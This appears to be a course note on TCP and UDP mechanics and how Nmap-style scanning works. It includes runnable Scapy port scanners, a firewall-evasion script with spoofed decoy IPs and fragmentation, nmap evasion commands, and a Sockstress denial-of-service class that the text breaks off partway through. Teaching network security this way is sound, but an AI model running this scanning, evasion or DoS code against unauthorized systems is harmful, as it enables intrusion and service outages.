# Transport Layer Mechanics: TCP, UDP, and Port Scanning

---
title: "Transport Layer Mechanics"
parent: "[[02_Networking]]"
tags:
  - network
  - layer-4
  - tcp
  - udp
  - scanning
  - firewall-evasion
  - nmap
created: 2026-01-23
updated: 2026-01-24
---

> **Executive Summary**: Layer 4 (Transport Layer) is the bridge between the network infrastructure and the applications running on it. For a hacker, this is the layer of "Ports" and "Connections." Mastering the TCP State Machine, Windowing, and Flag manipulation is not just academic—it is the direct requirement for understanding how **Nmap** works, how to evade Firewalls (IDS/IPS), and how to perform Denial of Service attacks effectively.

---

## Table of Contents
1. [Learning Objectives](#1-learning-objectives)
2. [UDP: The "Fire and Forget" Protocol](#2-udp-the-fire-and-forget-protocol)
3. [TCP: The State Machine](#3-tcp-the-state-machine)
4. [TCP Flags & Headers: The Hacker's Controls](#4-tcp-flags--headers-the-hackers-controls)
5. [Port Scanning Mechanics (Nmap Internals)](#5-port-scanning-mechanics-nmap-internals)
6. [Firewall Evasion Techniques](#6-firewall-evasion-techniques)
7. [Flow Control & Congestion](#7-flow-control--congestion)
8. [Practical Lab: Manual Handshakes with Scapy](#8-practical-lab-manual-handshakes-with-scapy)
9. [Advanced TCP Attacks](#9-advanced-tcp-attacks)
10. [UDP-Based Attacks](#10-udp-based-attacks)
11. [Port Scanning Tools & Techniques](#11-port-scanning-tools--techniques)
12. [Connection Tracking & Session Hijacking](#12-connection-tracking--session-hijacking)
13. [Defense Mechanisms](#13-defense-mechanisms)
14. [Performance Tuning & Optimization](#14-performance-tuning--optimization)
15. [Critical Analysis & Checkpoints](#15-critical-analysis--checkpoints)

---

## 1. Learning Objectives

By the end of this chapter, you will be able to:

- **Visualize Connections**: Trace a packet from `SYN` to `ESTABLISHED` to `TIME_WAIT`.
- **Decode Nmap**: Explain exactly why `nmap -sS` works and how it differs from `-sT`.
- **Bypass Filters**: Use ACK scans and Window manipulation to map firewall rulesets.
- **Weaponize State**: Explain how SYN Floods and Sockstress attacks exploit the TCP state machine.
- **Analyze Traffic**: Identify port scans and anomalies in Wireshark based on flag combinations.
- **Perform Connection Hijacking**: Understand TCP sequence prediction and session takeover.
- **Build Custom Scanners**: Create your own port scanning tools with Python.
- **Evade Detection**: Understand timing, fragmentation, and decoy techniques.

---

## 2. UDP: The "Fire and Forget" Protocol

User Datagram Protocol (UDP) is simple, stateless, and unreliable.

### 2.1 For Beginners: Understanding UDP

**Analogy**: UDP is like sending postcards vs TCP which is like certified mail:

```
UDP (Postcard):
┌─────────────────────────┐
│ Quick to send          │
│ No confirmation        │
│ Might get lost         │
│ Might arrive out of    │
│ order                  │
│ Cheap and fast         │
└─────────────────────────┘

TCP (Certified Mail):
┌─────────────────────────┐
│ Slower to send         │
│ Confirmation required  │
│ Guaranteed delivery    │
│ Arrives in order       │
│ More expensive         │
└─────────────────────────┘
```

### 2.2 UDP Header Structure

```
UDP Header (8 bytes only!):
 0      7 8     15 16    23 24    31
+--------+--------+--------+--------+
|     Source      |   Destination   |
|      Port       |      Port       |
+--------+--------+--------+--------+
|                 |                 |
|     Length      |    Checksum     |
+--------+--------+--------+--------+
|                                   |
|          Data / Payload           |
+-----------------------------------+

Field Breakdown:
- Source Port (16 bits): Sender's port
- Destination Port (16 bits): Receiver's port
- Length (16 bits): Total length (header + data)
- Checksum (16 bits): Error detection (optional in IPv4)
```

### 2.3 UDP Characteristics

- **No Handshake**: Just send data.
- **No Guarantee**: Packet lost? Too bad.
- **No Ordering**: Packet 2 might arrive before Packet 1.
- **Header**: Only 8 Bytes (vs TCP's 20+ bytes)
- **Fast**: No connection overhead
- **Stateless**: No connection tracking needed

### 2.4 Common UDP Services

```
Port    Service         Description
─────   ─────────────   ─────────────────────────────
53      DNS             Domain Name System
67/68   DHCP            Dynamic Host Configuration
69      TFTP            Trivial File Transfer
123     NTP             Network Time Protocol
161/162 SNMP            Network Management
514     Syslog          System Logging
1194    OpenVPN         VPN
4500    IPsec NAT-T     VPN
```

### 2.5 UDP Security Implications

**1. Scanning Difficulty**: 
```
Send UDP packet to port:

OPEN Port:
  → Usually NO reply
  (Application consumes packet)
  
CLOSED Port:
  → ICMP Type 3 Code 3 (Port Unreachable)
  
FILTERED Port:
  → NO reply
  (Firewall drops packet)

Problem: OPEN looks same as FILTERED!
Nmap often reports "Open|Filtered"
```

**2. Spoofing**: Since there is no handshake, you can trivially spoof the Source IP.

**3. Amplification**: Send a small query (60 bytes) to a DNS server, spoofing the victim's IP. The server sends a huge reply (3000 bytes) to the victim. (DDoS).

### 2.6 UDP Scanning Code

```python
#!/usr/bin/env python3
"""
UDP Port Scanner
"""

from scapy.all import *
import time

def udp_scan(target, ports):
    """
    UDP port scanner
    """
    print(f"[*] UDP Scan: {target}")
    print(f"[*] Ports: {ports}\n")
    
    open_ports = []
    closed_ports = []
    filtered_ports = []
    
    for port in ports:
        # Send UDP packet
        packet = IP(dst=target)/UDP(dport=port)
        response = sr1(packet, timeout=2, verbose=0)
        
        if response is None:
            # No response - could be open or filtered
            filtered_ports.append(port)
            print(f"Port {port}: Open|Filtered")
        
        elif response.haslayer(ICMP):
            # ICMP error response
            if response[ICMP].type == 3 and response[ICMP].code == 3:
                # Port Unreachable = Closed
                closed_ports.append(port)
                print(f"Port {port}: Closed")
        
        elif response.haslayer(UDP):
            # Got UDP response = Open
            open_ports.append(port)
            print(f"Port {port}: Open")
        
        time.sleep(0.1)  # Rate limiting
    
    # Summary
    print(f"\n{'='*50}")
    print(f"SCAN SUMMARY")
    print(f"{'='*50}")
    print(f"Open:         {len(open_ports)}")
    print(f"Closed:       {len(closed_ports)}")
    print(f"Open|Filtered: {len(filtered_ports)}")
    
    if open_ports:
        print(f"\nOpen Ports: {open_ports}")

# Example usage
if __name__ == "__main__":
    target = input("[?] Target IP: ")
    ports = [53, 67, 69, 123, 161, 514, 1194]
    udp_scan(target, ports)
```

---

## 3. TCP: The State Machine

Transmission Control Protocol (TCP) provides reliable, ordered delivery. It manages a "Connection" state.

### 3.1 For Beginners: TCP vs UDP

**TCP is like a phone call**:
```
1. Dial number (SYN)
2. Other person answers (SYN-ACK)
3. You say "Hello" (ACK)
4. Conversation happens
5. You say "Goodbye" (FIN)
6. Hang up
```

**UDP is like shouting across the street**:
```
1. Just yell your message
2. Hope they heard it
3. Don't wait for confirmation
```

### 3.2 The 3-Way Handshake (Connection Establishment)

```
Client                                Server
  │                                      │
  │  SYN (Seq=1000)                      │
  │─────────────────────────────────────>│
  │                                      │
  │        SYN-ACK (Seq=2000, Ack=1001)  │
  │<─────────────────────────────────────│
  │                                      │
  │  ACK (Seq=1001, Ack=2001)           │
  │─────────────────────────────────────>│
  │                                      │
  │    [Connection ESTABLISHED]          │
```

**Step-by-Step**:
1.  **SYN (Seq=X)**: Client → Server. "I want to connect." State: `SYN_SENT`.
2.  **SYN-ACK (Seq=Y, Ack=X+1)**: Server → Client. "I accept. Here is my sequence." State: `SYN_RECV`.
3.  **ACK (Seq=X+1, Ack=Y+1)**: Client → Server. "Acknowledged." State: `ESTABLISHED`.

### 3.3 The 4-Way Teardown (Termination)

```
Client                                Server
  │                                      │
  │  FIN (Seq=1500)                      │
  │─────────────────────────────────────>│
  │                                      │
  │        ACK (Ack=1501)                │
  │<─────────────────────────────────────│
  │                                      │
  │        FIN (Seq=2500)                │
  │<─────────────────────────────────────│
  │                                      │
  │  ACK (Ack=2501)                     │
  │─────────────────────────────────────>│
  │                                      │
  │    [Connection CLOSED]               │
```

**Steps**:
1.  **FIN**: Client → Server. "I'm done sending." State: `FIN_WAIT_1`.
2.  **ACK**: Server → Client. "I heard you." State: `CLOSE_WAIT` (Server side), `FIN_WAIT_2` (Client side).
3.  **FIN**: Server → Client. "I'm done too." State: `LAST_ACK`.
4.  **ACK**: Client → Server. "Bye." State: `TIME_WAIT` (Client), `CLOSED` (Server).

**TIME_WAIT**: The client keeps the socket closed for 2xMSL (Maximum Segment Lifetime) to ensure any stray packets are drained.

### 3.4 TCP State Diagram

```
                        ┌─────────────┐
                        │   CLOSED    │
                        └──────┬──────┘
                               │
                      PASSIVE  │ACTIVE
                       OPEN    │ OPEN
                               │
                    ┌──────────┴──────────┐
                    │                     │
                    ▼                     ▼
              ┌──────────┐         ┌──────────┐
              │  LISTEN  │         │SYN_SENT  │
              └────┬─────┘         └────┬─────┘
                   │                    │
            RCV SYN│               RCV  │SND SYN
            SND SYN│               SYN-ACK│ACK
            ACK    │                    │
                   │                    │
                   ▼                    ▼
              ┌──────────┐         ┌──────────┐
              │ SYN_RCVD │         │   ESTAB  │
              └────┬─────┘         └────┬─────┘
                   │                    │
           RCV ACK │              CLOSE │
                   │              SND FIN
                   ▼                    ▼
              ┌──────────┐         ┌──────────┐
              │  ESTAB   │         │FIN_WAIT_1│
              └────┬─────┘         └────┬─────┘
                   │                    │
              CLOSE│              RCV FIN
              SND FIN              SND ACK
                   │                    │
                   ▼                    ▼
              ┌──────────┐         ┌──────────┐
              │FIN_WAIT_1│         │ CLOSING  │
              └────┬─────┘         └────┬─────┘
                   │                    │
            RCV FIN│              RCV ACK
            SND ACK│                    │
                   │                    │
                   ▼                    ▼
              ┌──────────┐         ┌──────────┐
              │FIN_WAIT_2│         │TIME_WAIT │
              └────┬─────┘         └────┬─────┘
                   │                    │
            RCV FIN│              2MSL  │
            SND ACK│              TIMEOUT
                   │                    │
                   ▼                    ▼
              ┌──────────┐         ┌──────────┐
              │TIME_WAIT │         │  CLOSED  │
              └────┬─────┘         └──────────┘
                   │
            2MSL   │TIMEOUT
                   │
                   ▼
              ┌──────────┐
              │  CLOSED  │
              └──────────┘
```

### 3.5 TCP Connection Tracking Code

```python
#!/usr/bin/env python3
"""
TCP Connection State Tracker
"""

from scapy.all import *
from collections import defaultdict

class TCPStateTracker:
    def __init__(self):
        self.connections = {}  # {(src, dst, sport, dport): state}
    
    def get_key(self, packet):
        """Generate connection key"""
        if TCP not in packet or IP not in packet:
            return None
        
        src = (packet[IP].src, packet[TCP].sport)
        dst = (packet[IP].dst, packet[TCP].dport)
        
        # Normalize key (bidirectional)
        return tuple(sorted([src, dst]))
    
    def update_state(self, packet):
        """Update connection state based on flags"""
        if TCP not in packet:
            return
        
        key = self.get_key(packet)
        if not key:
            return
        
        flags = packet[TCP].flags
        
        # Initialize if new
        if key not in self.connections:
            self.connections[key] = {
                'state': 'CLOSED',
                'packets': 0,
                'bytes': 0
            }
        
        conn = self.connections[key]
        old_state = conn['state']
        
        # State transitions based on flags
        if flags & 0x02:  # SYN
            if flags & 0x10:  # SYN-ACK
                conn['state'] = 'SYN_RECEIVED'
            else:  # SYN only
                conn['state'] = 'SYN_SENT'
        
        elif flags & 0x10 and not (flags & 0x01):  # ACK (no FIN)
            if conn['state'] in ['SYN_SENT', 'SYN_RECEIVED']:
                conn['state'] = 'ESTABLISHED'
        
        elif flags & 0x01:  # FIN
            if conn['state'] == 'ESTABLISHED':
                conn['state'] = 'FIN_WAIT_1'
            elif conn['state'] == 'FIN_WAIT_1':
                conn['state'] = 'CLOSING'
        
        elif flags & 0x04:  # RST
            conn['state'] = 'CLOSED'
        
        conn['packets'] += 1
        conn['bytes'] += len(packet)
        
        # Print state change
        if old_state != conn['state']:
            print(f"[*] {key[0]} <-> {key[1]}")
            print(f"    {old_state} -> {conn['state']}")
    
    def display_connections(self):
        """Display all connections"""
        print(f"\n{'='*80}")
        print(f"TCP CONNECTIONS")
        print(f"{'='*80}")
        
        for key, conn in self.connections.items():
            print(f"{key[0]} <-> {key[1]}")
            print(f"  State: {conn['state']}")
            print(f"  Packets: {conn['packets']}, Bytes: {conn['bytes']}")
            print()

# Example usage
if __name__ == "__main__":
    tracker = TCPStateTracker()
    
    print("[*] Tracking TCP connections...")
    print("[*] Press Ctrl+C to stop\n")
    
    def process(pkt):
        tracker.update_state(pkt)
    
    try:
        sniff(filter="tcp", prn=process, store=0)
    except KeyboardInterrupt:
        tracker.display_connections()
```

---

## 4. TCP Flags & Headers: The Hacker's Controls

The TCP Header contains 6 (modern 9) control bits.

### 4.1 TCP Header Structure

```
TCP Header (20-60 bytes):
 0                   1                   2                   3
 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|          Source Port          |       Destination Port        |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                        Sequence Number                        |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                    Acknowledgment Number                      |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|  Data |           |U|A|P|R|S|F|                               |
| Offset| Reserved  |R|C|S|S|Y|I|            Window             |
|       |           |G|K|H|T|N|N|                               |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|           Checksum            |         Urgent Pointer        |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                    Options                    |    Padding    |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
```

### 4.2 TCP Flags Explained

```
Flag    Bit    Hex     Purpose
────    ───    ───     ────────────────────────────────
FIN     0x01   0x01    Finish - No more data
SYN     0x02   0x02    Synchronize - Start connection
RST     0x04   0x04    Reset - Abort connection
PSH     0x08   0x08    Push - Send to application now
ACK     0x10   0x10    Acknowledge - Confirm receipt
URG     0x20   0x20    Urgent - Priority data
ECE     0x40   0x40    ECN Echo - Congestion notification
CWR     0x80   0x80    Congestion Window Reduced
NS      0x100  0x100   Nonce Sum - ECN concealment protection
```

**Common Flag Combinations**:
```
SYN         (0x02)   - Connection request
SYN-ACK     (0x12)   - Connection accepted
ACK         (0x10)   - Data acknowledged
FIN-ACK     (0x11)   - Graceful close
RST         (0x04)   - Force close
RST-ACK     (0x14)   - Reject connection
PSH-ACK     (0x18)   - Send data immediately
FIN-PSH-URG (0x29)   - XMAS scan
NULL        (0x00)   - No flags (scan technique)
```

### 4.3 For Beginners: Understanding TCP Flags

**Think of flags like signals in a conversation**:

```
SYN = "Hello, want to talk?"
SYN-ACK = "Yes, I'm listening!"
ACK = "Got it, thanks"
FIN = "I'm done talking"
RST = "STOP! End this now!"
PSH = "This is important, pay attention!"
URG = "URGENT! Read this first!"
```

### 4.4 Manipulating TCP Flags

```python
#!/usr/bin/env python3
"""
TCP Flag Manipulation Examples
"""

from scapy.all import *

def send_custom_flags(target, port, flags):
    """
    Send TCP packet with custom flags
    """
    packet = IP(dst=target)/TCP(dport=port, flags=flags)
    
    print(f"[*] Sending to {target}:{port}")
    print(f"[*] Flags: {flags}")
    
    response = sr1(packet, timeout=2, verbose=0)
    
    if response:
        print(f"[+] Response received:")
        print(f"    Flags: {response[TCP].flags}")
        return response
    else:
        print(f"[-] No response")
        return None

def xmas_scan(target, port):
    """
    XMAS scan (FIN+PSH+URG)
    """
    print(f"[*] XMAS Scan: {target}:{port}")
    
    # FIN=0x01, PSH=0x08, URG=0x20 = 0x29
    response = send_custom_flags(target, port, "FPU")
    
    if response is None:
        print("[*] Port likely OPEN or FILTERED")
    elif response.haslayer(TCP):
        if response[TCP].flags & 0x04:  # RST
            print("[*] Port CLOSED")

def null_scan(target, port):
    """
    NULL scan (no flags)
    """
    print(f"[*] NULL Scan: {target}:{port}")
    
    response = send_custom_flags(target, port, "")
    
    if response is None:
        print("[*] Port likely OPEN or FILTERED")
    elif response.haslayer(TCP):
        if response[TCP].flags & 0x04:  # RST
            print("[*] Port CLOSED")

def fin_scan(target, port):
    """
    FIN scan
    """
    print(f"[*] FIN Scan: {target}:{port}")
    
    response = send_custom_flags(target, port, "F")
    
    if response is None:
        print("[*] Port likely OPEN or FILTERED")
    elif response.haslayer(TCP):
        if response[TCP].flags & 0x04:  # RST
            print("[*] Port CLOSED")

# Example usage
if __name__ == "__main__":
    target = input("[?] Target IP: ")
    port = int(input("[?] Target port: "))
    
    print("""
Scan Types:
1. XMAS scan (FIN+PSH+URG)
2. NULL scan (no flags)
3. FIN scan
4. Custom flags
    """)
    
    choice = input("[?] Select: ")
    
    if choice == "1":
        xmas_scan(target, port)
    elif choice == "2":
        null_scan(target, port)
    elif choice == "3":
        fin_scan(target, port)
    elif choice == "4":
        flags = input("[?] Flags (S/A/F/R/P/U): ")
        send_custom_flags(target, port, flags)
```

---

## 5. Port Scanning Mechanics (Nmap Internals)

How does Nmap determine if a port is Open, Closed, or Filtered?

### 5.1 For Beginners: What is Port Scanning?

**Analogy**: Imagine a building with 65,535 doors (ports):

```
Port Scanning = Trying each door to see if it's:
- OPEN (service running, you can enter)
- CLOSED (no service, door locked)
- FILTERED (firewall blocking, can't even reach door)
```

**Common Ports**:
```
Port    Service
────    ────────
21      FTP
22      SSH
23      Telnet
25      SMTP
53      DNS
80      HTTP
443     HTTPS
445     SMB
3389    RDP
```

### 5.2 TCP Connect Scan (`-sT`)

**Mechanism**: Calls the OS `connect()` syscall. Completes the 3-Way Handshake.

```
Flow:
Client → Server: SYN
Server → Client: SYN-ACK (port OPEN)
Client → Server: ACK
Client → Server: RST (close immediately)

Pros:
✓ No root required
✓ Reliable
✓ Works through any firewall that allows connections

Cons:
✗ Noisy (full connection logged)
✗ Slow (complete handshake for each port)
✗ Easily detected
```

### 5.3 TCP SYN Scan (`-sS`) - "Stealth"

**Mechanism**: Sends raw SYN packets. Never completes handshake.

```
Flow:
Client → Server: SYN
Server → Client: SYN-ACK (port OPEN)
Client → Server: RST (don't complete)

Or:
Client → Server: SYN
Server → Client: RST-ACK (port CLOSED)

Pros:
✓ Faster
✓ Often bypasses application logging
✓ Less noisy

Cons:
✗ Requires root/admin
✗ Still detectable by IDS
```

### 5.4 TCP Null, FIN, Xmas Scans

**Mechanism**: Exploiting RFC standards. "If a closed port receives a packet without SYN/RST/ACK, send RST. If open, ignore."

```
Null Scan: No flags set
FIN Scan: Only FIN flag
XMAS Scan: FIN + PSH + URG

Result:
- RST received → CLOSED
- No reply → OPEN|FILTERED

Caveat: Windows violates RFC!
Windows sends RST for everything.
These scans work on Linux/Unix only.
```

### 5.5 ACK Scan (`-sA`)

**Goal**: Map firewall rules, not find open ports.

```
Mechanism:
Send ACK packet (pretend we're in established connection)

Stateful Firewall:
  "No connection state for this ACK" → DROP

Stateless Firewall:
  "ACK allowed (established traffic)" → PASS

Host:
  "Why ACK? I never SYN'd" → Send RST

Interpretation:
- RST received = UNFILTERED
- No reply = FILTERED
```

### 5.6 Complete Nmap-Style Scanner

```python
#!/usr/bin/env python3
"""
Complete Port Scanner (Nmap-style)
Implements multiple scan techniques
"""

from scapy.all import *
import time

class PortScanner:
    def __init__(self, target):
        self.target = target
        self.results = {}
    
    def syn_scan(self, ports):
        """
        SYN scan (stealth)
        """
        print(f"[*] SYN Scan: {self.target}")
        
        for port in ports:
            # Send SYN
            syn = IP(dst=self.target)/TCP(dport=port, flags="S")
            response = sr1(syn, timeout=1, verbose=0)
            
            if response is None:
                self.results[port] = "Filtered"
                print(f"Port {port}: Filtered")
            
            elif response.haslayer(TCP):
                if response[TCP].flags == 0x12:  # SYN-ACK
                    self.results[port] = "Open"
                    print(f"Port {port}: Open")
                    # Send RST to close
                    rst = IP(dst=self.target)/TCP(dport=port, flags="R")
                    send(rst, verbose=0)
                
                elif response[TCP].flags == 0x14:  # RST-ACK
                    self.results[port] = "Closed"
                    print(f"Port {port}: Closed")
            
            time.sleep(0.1)
    
    def connect_scan(self, ports):
        """
        TCP Connect scan
        """
        print(f"[*] Connect Scan: {self.target}")
        
        for port in ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((self.target, port))
                
                if result == 0:
                    self.results[port] = "Open"
                    print(f"Port {port}: Open")
                else:
                    self.results[port] = "Closed"
                    print(f"Port {port}: Closed")
                
                sock.close()
            except:
                self.results[port] = "Filtered"
                print(f"Port {port}: Filtered")
            
            time.sleep(0.1)
    
    def fin_scan(self, ports):
        """
        FIN scan
        """
        print(f"[*] FIN Scan: {self.target}")
        
        for port in ports:
            fin = IP(dst=self.target)/TCP(dport=port, flags="F")
            response = sr1(fin, timeout=1, verbose=0)
            
            if response is None:
                self.results[port] = "Open|Filtered"
                print(f"Port {port}: Open|Filtered")
            
            elif response.haslayer(TCP):
                if response[TCP].flags & 0x04:  # RST
                    self.results[port] = "Closed"
                    print(f"Port {port}: Closed")
            
            elif response.haslayer(ICMP):
                self.results[port] = "Filtered"
                print(f"Port {port}: Filtered")
            
            time.sleep(0.1)
    
    def xmas_scan(self, ports):
        """
        XMAS scan (FIN+PSH+URG)
        """
        print(f"[*] XMAS Scan: {self.target}")
        
        for port in ports:
            xmas = IP(dst=self.target)/TCP(dport=port, flags="FPU")
            response = sr1(xmas, timeout=1, verbose=0)
            
            if response is None:
                self.results[port] = "Open|Filtered"
                print(f"Port {port}: Open|Filtered")
            
            elif response.haslayer(TCP):
                if response[TCP].flags & 0x04:  # RST
                    self.results[port] = "Closed"
                    print(f"Port {port}: Closed")
            
            time.sleep(0.1)
    
    def udp_scan(self, ports):
        """
        UDP scan
        """
        print(f"[*] UDP Scan: {self.target}")
        
        for port in ports:
            udp = IP(dst=self.target)/UDP(dport=port)
            response = sr1(udp, timeout=2, verbose=0)
            
            if response is None:
                self.results[port] = "Open|Filtered"
                print(f"Port {port}: Open|Filtered")
            
            elif response.haslayer(UDP):
                self.results[port] = "Open"
                print(f"Port {port}: Open")
            
            elif response.haslayer(ICMP):
                if response[ICMP].type == 3 and response[ICMP].code == 3:
                    self.results[port] = "Closed"
                    print(f"Port {port}: Closed")
            
            time.sleep(0.2)
    
    def scan(self, ports, scan_type="syn"):
        """
        Perform scan
        """
        if scan_type == "syn":
            self.syn_scan(ports)
        elif scan_type == "connect":
            self.connect_scan(ports)
        elif scan_type == "fin":
            self.fin_scan(ports)
        elif scan_type == "xmas":
            self.xmas_scan(ports)
        elif scan_type == "udp":
            self.udp_scan(ports)
        
        return self.results

# Example usage
if __name__ == "__main__":
    target = input("[?] Target IP: ")
    
    print("""
Scan Types:
1. SYN scan (requires root)
2. Connect scan
3. FIN scan
4. XMAS scan
5. UDP scan
    """)
    
    scan_type_choice = input("[?] Select: ")
    
    scan_types = {
        "1": "syn",
        "2": "connect",
        "3": "fin",
        "4": "xmas",
        "5": "udp"
    }
    
    scan_type = scan_types.get(scan_type_choice, "syn")
    
    # Common ports
    ports = [21, 22, 23, 25, 53, 80, 443, 445, 3389, 8080]
    
    scanner = PortScanner(target)
    results = scanner.scan(ports, scan_type)
    
    print(f"\n{'='*50}")
    print(f"SCAN RESULTS")
    print(f"{'='*50}")
    for port, status in sorted(results.items()):
        print(f"Port {port}: {status}")
```

---

## 6. Firewall Evasion Techniques

### 6.1 ACK Scanning (`-sA`)

**Goal**: Map firewall rules, not open ports.

```
Mechanism: Send ACK packet

Stateful Firewall:
  "No connection state" → DROP (Filtered)

Stateless Firewall:
  "ACK allowed" → PASS → Host sends RST

Result:
- RST = UNFILTERED (no firewall or stateless)
- No reply = FILTERED (stateful firewall)
```

### 6.2 Source Port Manipulation (`--source-port 53`)

Some poorly configured firewalls allow ANY traffic coming *from* Port 53 (DNS) or 20 (FTP Data).

```bash
# Normal scan (might be blocked)
nmap -sS -p 80 target.com

# Scan from DNS port (might bypass firewall)
nmap -sS --source-port 53 -p 80 target.com

# Other trusted ports
nmap -sS --source-port 20 -p 80 target.com   # FTP data
nmap -sS --source-port 88 -p 80 target.com   # Kerberos
```

### 6.3 Fragmentation Evasion

```bash
# Fragment packets to evade IDS
nmap -f target.com

# Set custom MTU
nmap --mtu 24 target.com

# Must be multiple of 8
```

### 6.4 Timing and Decoys

```bash
# Slow scan to evade rate-based IDS
nmap -T0 target.com  # Paranoid (5 min between packets)
nmap -T1 target.com  # Sneaky (15 sec between packets)
nmap -T2 target.com  # Polite (0.4 sec between packets)

# Decoy scans
nmap -D RND:10 target.com  # 10 random decoys
nmap -D decoy1,decoy2,ME target.com  # Specific decoys
```

### 6.5 Firewall Evasion Script

```python
#!/usr/bin/env python3
"""
Firewall Evasion Scanning Techniques
"""

from scapy.all import *
import random

def source_port_scan(target, dest_port, source_port=53):
    """
    Scan with specific source port
    """
    print(f"[*] Source port scan: {target}:{dest_port}")
    print(f"[*] Using source port: {source_port}")
    
    syn = IP(dst=target)/TCP(sport=source_port, dport=dest_port, flags="S")
    response = sr1(syn, timeout=2, verbose=0)
    
    if response and response.haslayer(TCP):
        if response[TCP].flags == 0x12:
            print(f"[+] Port {dest_port}: OPEN")
            # Send RST
            send(IP(dst=target)/TCP(sport=source_port, dport=dest_port, flags="R"), verbose=0)
            return True
    
    print(f"[-] Port {dest_port}: Filtered/Closed")
    return False

def fragmented_scan(target, dest_port):
    """
    Scan with fragmented packets
    """
    print(f"[*] Fragmented scan: {target}:{dest_port}")
    
    # Create packet
    packet = IP(dst=target)/TCP(dport=dest_port, flags="S")
    
    # Fragment into small pieces
    fragments = fragment(packet, fragsize=8)
    
    print(f"[*] Sending {len(fragments)} fragments...")
    
    for frag in fragments:
        send(frag, verbose=0)
        time.sleep(0.1)
    
    # Listen for response
    response = sr1(IP(dst=target)/TCP(dport=dest_port, flags="S"), 
                   timeout=2, verbose=0)
    
    if response and response.haslayer(TCP):
        if response[TCP].flags == 0x12:
            print(f"[+] Port {dest_port}: OPEN")
            return True
    
    print(f"[-] Port {dest_port}: Filtered/Closed")
    return False

def decoy_scan(target, dest_port, num_decoys=5):
    """
    Scan with decoy IPs
    """
    print(f"[*] Decoy scan: {target}:{dest_port}")
    print(f"[*] Using {num_decoys} decoys")
    
    # Generate random decoy IPs
    decoys = []
    for _ in range(num_decoys):
        decoy = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
        decoys.append(decoy)
    
    # Real scan
    our_ip = conf.route.route("0.0.0.0")[1]
    
    # Mix real and decoys
    all_ips = decoys + [our_ip]
    random.shuffle(all_ips)
    
    print(f"[*] Scan sources: {all_ips[:3]}... and {len(all_ips)-3} more")
    
    # Send from each IP
    for src_ip in all_ips:
        packet = IP(src=src_ip, dst=target)/TCP(dport=dest_port, flags="S")
        send(packet, verbose=0)
        time.sleep(0.1)
    
    # Listen for response to our real IP
    response = sr1(IP(dst=target)/TCP(dport=dest_port, flags="S"), 
                   timeout=2, verbose=0)
    
    if response and response.haslayer(TCP):
        if response[TCP].flags == 0x12:
            print(f"[+] Port {dest_port}: OPEN")
            return True
    
    print(f"[-] Port {dest_port}: Filtered/Closed")
    return False

# Example usage
if __name__ == "__main__":
    target = input("[?] Target IP: ")
    port = int(input("[?] Target port: "))
    
    print("""
Evasion Techniques:
1. Source port manipulation (port 53)
2. Fragmented packets
3. Decoy scan
    """)
    
    choice = input("[?] Select: ")
    
    if choice == "1":
        source_port_scan(target, port)
    elif choice == "2":
        fragmented_scan(target, port)
    elif choice == "3":
        decoy_scan(target, port)
```

---

## 7. Flow Control & Congestion

### 7.1 TCP Windowing

TCP is a "Sliding Window" protocol.

**For Beginners**: Think of the window as a conveyor belt:

```
Window Size = How many boxes can be on the belt at once

Large Window:
┌────────────────────────────────┐
│ [Box][Box][Box][Box][Box][Box]│  Fast!
└────────────────────────────────┘

Small Window:
┌────────────────────────────────┐
│ [Box][ ][ ][ ][ ][ ]            │  Slow!
└────────────────────────────────┘

Window = 0:
┌────────────────────────────────┐
│ [ ][ ][ ][ ][ ][ ]              │  STOPPED!
└────────────────────────────────┘
```

### 7.2 Flow Control Mechanism

```
Sender                            Receiver
  │                                  │
  │  Data (Seq=1000, Len=500)       │
  │─────────────────────────────────>│
  │                                  │
  │  Data (Seq=1500, Len=500)       │
  │─────────────────────────────────>│
  │                                  │
  │     ACK (Ack=2000, Win=2000)    │
  │<─────────────────────────────────│
  │     "Send up to 2000 more bytes"│
  │                                  │
  │  Data (Seq=2000, Len=1000)      │
  │─────────────────────────────────>│
  │                                  │
  │     ACK (Ack=3000, Win=0)       │
  │<─────────────────────────────────│
  │     "STOP! Buffer full!"         │
  │                                  │
  │  [Sender waits]                 │
  │                                  │
  │     Window Update (Win=5000)    │
  │<─────────────────────────────────│
  │     "OK, continue!"              │
```

### 7.3 Sockstress Attack

**Concept**: Exhaust server resources by keeping connections in limbo.

```
Attack Flow:
1. Complete 3-way handshake
2. Set Window=0 (tell server "I can't receive")
3. Server keeps connection open
4. Repeat 1000s of times
5. Server runs out of memory/connections

Victim can't:
- Send data (Window=0)
- Close connection (attacker doesn't send FIN)
- Free resources
```

### 7.4 Sockstress Implementation

```python
#!/usr/bin/env python3
"""
Sockstress Attack - Zero Window DoS
WARNING: Educational purposes only!
"""

from scapy.all import *
import threading

class SockstressAttack:
    def __init__(self, target, port):
        self.target = target
        self.port = port
        self.connections = []
        self.running = True
    
    def create_connection(self):
        """
        Establish connection with zero window
        """
        # Random source port
        sport = random.randint(10000, 65535)
        
        # Send SYN
        syn = IP(dst=self.target)/TCP(sport=sport, dport=self.port, flags="S", seq=1000)
        syn_ack = sr1(syn, timeout=2, verbose=0)
        
        if syn_ack and syn_ack.haslayer(TCP):
            if syn_ack[TCP].flags == 0x12:  # SYN-ACK
                # Send ACK with Window=0
                ack = IP(dst=self.target)/TCP(
                    sport=sport, 
                    dport=self.port, 
                    flags="A", 
                    seq=1001, 
                    ack=syn_ack[TCP].seq+1,
